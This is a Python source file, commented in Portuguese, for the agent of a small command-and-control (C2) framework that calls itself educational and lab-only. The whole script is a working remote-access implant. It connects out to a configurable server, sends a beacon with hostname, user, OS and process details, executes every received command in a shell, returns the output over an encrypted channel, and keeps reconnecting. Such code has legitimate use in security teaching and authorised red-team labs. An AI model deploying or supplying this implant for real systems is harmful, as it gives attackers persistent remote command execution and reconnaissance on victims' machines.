#!/usr/bin/env python3
"""
agent/agent.py — Agente C2
Conecta ao servidor, aguarda comandos e retorna resultados.

Uso:
  python3 agent/agent.py
  python3 agent/agent.py --server 192.168.1.10 --port 4444 --password minha_senha

AVISO LEGAL: Apenas para uso em laboratório autorizado.
Execute SOMENTE em máquinas que você possui ou tem permissão explícita.
"""

import socket
import subprocess
import argparse
import platform
import getpass
import json
import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from shared.crypto import derive_keys, encrypt, decrypt, encode_packet, recv_packet


# ─── Coleta de informações do sistema ────────────────────────────────────────

def get_sysinfo() -> dict:
    """Coleta informações básicas do sistema para o beacon inicial."""
    return {
        "os":       platform.system(),
        "version":  platform.version()[:60],
        "arch":     platform.machine(),
        "hostname": socket.gethostname(),
        "user":     getpass.getuser(),
        "pid":      os.getpid(),
        "cwd":      os.getcwd(),
    }


# ─── Executor de comandos ─────────────────────────────────────────────────────

def execute(cmd: str) -> str:
    """Executa um comando no shell e retorna a saída."""
    # Comandos internos do agente
    if cmd.strip().lower() == "sysinfo":
        info = get_sysinfo()
        return "\n".join(f"{k:<12}: {v}" for k, v in info.items())

    if cmd.strip().lower() == "exit":
        return "__EXIT__"

    if cmd.strip().lower() in ("ifconfig", "ipconfig"):
        cmd = "ipconfig" if platform.system() == "Windows" else "ip addr || ifconfig"

    if cmd.strip().lower() == "ps":
        cmd = "tasklist" if platform.system() == "Windows" else "ps aux"

    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            cwd=os.getcwd(),
        )
        output = result.stdout + result.stderr
        return output.strip() if output.strip() else "(sem saída)"
    except subprocess.TimeoutExpired:
        return "[!] Timeout: comando demorou mais de 30 segundos"
    except Exception as e:
        return f"[!] Erro ao executar: {e}"


# ─── Loop principal do agente ─────────────────────────────────────────────────

def run_agent(server_host: str, server_port: int,
              enc_key: bytes, mac_key: bytes,
              retry_interval: int = 5):
    """Conecta ao servidor e entra no loop de recebimento de comandos."""

    while True:
        try:
            print(f"[*] Conectando a {server_host}:{server_port}...", flush=True)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((server_host, server_port))
            sock.settimeout(None)
            print("[+] Conectado!", flush=True)

            # Envia beacon de identificação
            beacon = json.dumps({
                "type": "beacon",
                "info": get_sysinfo(),
            }).encode()
            sock.sendall(encode_packet(encrypt(beacon, enc_key, mac_key)))

            # Loop de comandos
            while True:
                raw     = recv_packet(sock)
                message = json.loads(decrypt(raw, enc_key, mac_key))

                if message.get("type") != "cmd":
                    continue

                cmd    = message.get("data", "")
                output = execute(cmd)

                # Agente deve encerrar
                if output == "__EXIT__":
                    response = json.dumps({"type": "result", "data": "Agente encerrando."}).encode()
                    sock.sendall(encode_packet(encrypt(response, enc_key, mac_key)))
                    sock.close()
                    print("[-] Comando de saída recebido. Encerrando.")
                    return

                response = json.dumps({"type": "result", "data": output}).encode()
                sock.sendall(encode_packet(encrypt(response, enc_key, mac_key)))

        except (ConnectionRefusedError, ConnectionError, OSError) as e:
            print(f"[-] Conexão falhou: {e}. Tentando novamente em {retry_interval}s...")
            time.sleep(retry_interval)
        except KeyboardInterrupt:
            print("\n[-] Agente encerrado pelo usuário.")
            break
        except Exception as e:
            print(f"[-] Erro inesperado: {e}. Reconectando em {retry_interval}s...")
            time.sleep(retry_interval)


# ─── Entry point ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        prog="agent.py",
        description="Mini C2 — Agente (educacional)",
    )
    parser.add_argument("--server",   default="127.0.0.1",   help="IP do servidor C2 (padrão: 127.0.0.1)")
    parser.add_argument("--port",     default=4444, type=int, help="Porta do servidor (padrão: 4444)")
    parser.add_argument("--password", default="c2-edu-2024",  help="Senha compartilhada com o servidor")
    parser.add_argument("--retry",    default=5,    type=int, help="Intervalo de reconexão em segundos (padrão: 5)")
    args = parser.parse_args()

    enc_key, mac_key = derive_keys(args.password)
    run_agent(args.server, args.port, enc_key, mac_key, args.retry)


if __name__ == "__main__":
    main()
